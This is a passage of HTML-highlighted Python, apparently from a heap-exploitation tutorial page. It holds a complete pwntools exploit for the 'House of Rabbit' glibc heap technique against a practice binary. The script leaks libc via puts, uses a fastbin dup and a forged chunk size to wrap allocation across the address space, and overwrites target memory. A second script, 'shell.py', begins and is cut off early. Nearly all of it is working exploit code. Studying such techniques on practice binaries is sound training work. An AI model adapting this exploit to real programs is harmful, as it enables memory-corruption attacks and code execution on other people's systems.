+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_rabbit&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;&#39;, checksec=False)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>b *main
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+359
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+593
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+660
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+755
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+793
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>success</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>error</span><span class=p>(</span><span class=n>mess</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=n>mess</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>},</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_LIBRARY_PATH&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;malloc&#34; option; send size &amp; data.</span>
+</span></span><span class=line><span class=cl><span class=c1># Returns chunk index.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;size: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;data: &#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;free&#34; option; send index.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>index</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Select the &#34;amend age&#34; option; send new value.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>amend_age</span><span class=p>(</span><span class=n>age</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;age: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>age</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Calculate the &#34;wraparound&#34; distance between two addresses.</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delta</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=mh>0xffffffffffffffff</span> <span class=o>-</span> <span class=n>x</span><span class=p>)</span> <span class=o>+</span> <span class=n>y</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># This binary leaks the address of puts(), use it to resolve the libc load address.</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;puts() @ &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- PREPARE A FAKE CHUNK -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Craft a fake chunk using the &#34;age&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=c1># Set its prev_inuse flag to avoid backward consolidation.</span>
+</span></span><span class=line><span class=cl><span class=c1># This fake chunk has a size of 0, so it acts as its own forward consolidation guard.</span>
+</span></span><span class=line><span class=cl><span class=n>age</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;age: &#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>age</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- INCREASE MMAP THRESHOLD -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Before we can increase the main arena&#39;s system_mem value, we must increase the mmap_threshold.</span>
+</span></span><span class=line><span class=cl><span class=c1># We do this by requesting then freeing a chunk with size beyond the mmap threshold.</span>
+</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x5fff8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Y&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># Allocated via mmap().</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>mem</span><span class=p>)</span> <span class=c1># Freeing an mmapped chunk increases the mmap threshold to its size.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- INCREASE SYSTEM_MEM -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them</span>
+</span></span><span class=line><span class=cl><span class=c1># from a heap, rather than via mmap().</span>
+</span></span><span class=line><span class=cl><span class=c1># This in turn will increase the total memory checked out from the kernel, which is tracked by</span>
+</span></span><span class=line><span class=cl><span class=c1># an arena&#39;s system_mem field.</span>
+</span></span><span class=line><span class=cl><span class=n>mem</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x5fff8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Z&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Leverage a fastbin dup to link the fake &#34;age&#34; chunk into the 0x20 fastbin.</span>
+</span></span><span class=line><span class=cl><span class=n>dup</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>safety</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>safety</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>dup</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>user</span><span class=p>))</span> <span class=c1># Address of fake chunk.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Trigger malloc_consolidate() to move the fake chunk from the fastbins into the unsortedbin.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use a consolidation with the top chunk to achieve this.</span>
+</span></span><span class=line><span class=cl><span class=n>consolidate</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>consolidate</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it,</span>
+</span></span><span class=line><span class=cl><span class=c1># then requesting a chunk larger than the fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># This part is where the unsortedbin size sanity check would catch us if we hadn&#39;t increased system_mem.</span>
+</span></span><span class=line><span class=cl><span class=n>amend_age</span><span class=p>(</span><span class=mh>0x80001</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x80008</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;D&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Increase the fake chunk size so that it can wrap around the VA space to reach the target data.</span>
+</span></span><span class=line><span class=cl><span class=n>amend_age</span><span class=p>(</span><span class=mh>0xfffffffffffffff1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =-=-=- OVERWRITE TARGET DATA -=-=-=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Request a large chunk to bridge the gap between the fake chunk and the target.</span>
+</span></span><span class=line><span class=cl><span class=n>distance</span> <span class=o>=</span> <span class=n>delta</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>user</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>target</span> <span class=o>-</span> <span class=mh>0x20</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=n>distance</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request is serviced by the fake chunk&#39;s remainder and the first qword of user data overlaps the target data.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>24</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;Much win</span><span class=se>\0</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Check that the target data was overwritten.</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendthen</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;target: &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>target_data</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>assert</span> <span class=n>target_data</span> <span class=o>==</span> <span class=sa>b</span><span class=s2>&#34;Much win&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=shellpy>shell.py</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_rabbit&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;&#39;, checksec=False)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>b *main
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+359
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+593
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+660
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+755
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+793
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
